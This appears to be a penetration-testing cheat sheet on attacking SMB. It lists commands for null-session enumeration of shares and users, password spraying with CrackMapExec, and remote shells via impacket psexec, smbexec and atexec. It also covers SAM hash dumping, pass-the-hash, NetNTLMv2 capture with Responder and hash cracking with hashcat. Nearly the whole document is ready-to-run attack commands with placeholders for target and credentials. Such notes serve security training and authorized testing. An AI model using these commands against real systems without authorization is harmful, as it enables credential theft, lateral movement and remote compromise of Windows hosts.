# Attacking SMB (Server Message Block)
## Overview
- **Protocol Function:** Provides shared access to files and printers across network nodes.
- **Ports & Layers:**
    - Originally ran over NetBIOS over TCP/IP (NBT) using TCP/139 and UDP/137/138.
    - Modern Windows operates directly over TCP/445 (though port 139 is still used for NetBIOS failover or non-Windows hosts like Samba).
- **Related Protocols:** MSRPC (Microsoft Remote Procedure Call) often runs over SMB using named pipes as a transport layer.
## Enumeration
### 1. Nmap Scanning
Scan ports 139 and 445 for SMB versions, OS estimation, and basic scripts.
Bash
```
sudo nmap <target_ip> -sV -sC -p139,445
```

### 2. Null Session Enumeration (Anonymous)
When SMB allows unauthenticated access (null sessions), use specialized tools to list shares, users, groups, and policies.
- **Smbclient (List Shares):**
    Bash
    ```
    smbclient -N -L //<target_ip>
    ```
- **Smbmap (List Shares & Permissions):**
    Bash
    ```
    smbmap -H <target_ip>
    ```
- **Smbmap (Recursively Browse Directory):**
    Bash
    ```
    smbmap -H <target_ip> -r <share_name>
    ```
- **Smbmap (Download/Upload Files):**
    Bash
    ```
    smbmap -H <target_ip> --download "<share_name>\<file_name>"
    smbmap -H <target_ip> --upload <local_file> "<share_name>\<remote_file>"
    ```
    
- **Rpcclient (Enumerate Users):**
    Bash
    ```
    rpcclient -U'%' <target_ip>
    # Once inside prompt:
    # enumdomusers
    ```
- **Enum4linux-ng (Comprehensive Automated Enumeration):**
    Bash
    ```
    ./enum4linux-ng.py <target_ip> -A -C
    ```
## Protocol-Specific Attacks (Authenticated)
### 1. Password Spraying (CrackMapExec)
Test a single common password against a list of usernames to avoid account lockouts.
Bash
```
crackmapexec smb <target_ip> -u /tmp/userlist.txt -p '<password>' --local-auth
```
- _Tip: Use `--continue-on-success` to keep spraying past the first match._
### 2. Remote Code Execution (RCE)
If credentials possess administrative privileges, execute commands or spawn interactive shells on Windows systems.
- **Impacket PsExec:**
    Bash
    ```
    impacket-psexec <domain>/<username>:'<password>'@<target_ip>
    ```
- **Impacket SMBExec / Atexec:** Alternative methods useful when no writable share is available or when leveraging the Task Scheduler.
    Bash
    ```
    impacket-smbexec <domain>/<username>:'<password>'@<target_ip>
    impacket-atexec <domain>/<username>:'<password>'@<target_ip>
    ```
    
- **CrackMapExec (Command Execution):**
    Bash
    ```
    crackmapexec smb <target_ip> -u <username> -p '<password>' -x '<command>' --exec-method smbexec
    ```

### 3. Administrative Enumeration & Extraction via CME
- **Enumerate Logged-on Users:**
    Bash
    ```
    crackmapexec smb <subnet_or_ip> -u <username> -p '<password>' --loggedon-users
    ```
    
- **Extract SAM Database Hashes:**
    Bash
    ```
    crackmapexec smb <target_ip> -u <username> -p '<password>' --sam
    ```
    

### 4. Pass-the-Hash (PtH)
Authenticate using an NTLM user hash instead of a plaintext password.
Bash
```
crackmapexec smb <target_ip> -u <username> -H <LMHASH:NTHASH>
```
## Forced Authentication Attacks (Responder)

### 1. Capturing NetNTLMv2 Hashes

Set up a fake SMB/LLMNR/NBT-NS responder to intercept name resolution queries (e.g., when a user mistypes a file share path) and trick machines into sending authentication hashes.
Bash
```
sudo responder -I <interface_name>
```

- _Captured hashes are automatically logged under `/usr/share/responder/logs/`._
### 2. Cracking Captured NetNTLMv2 Hashes (Hashcat)

Use Hashcat with mode `5600` to crack captured hashes against a wordlist.

Bash

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```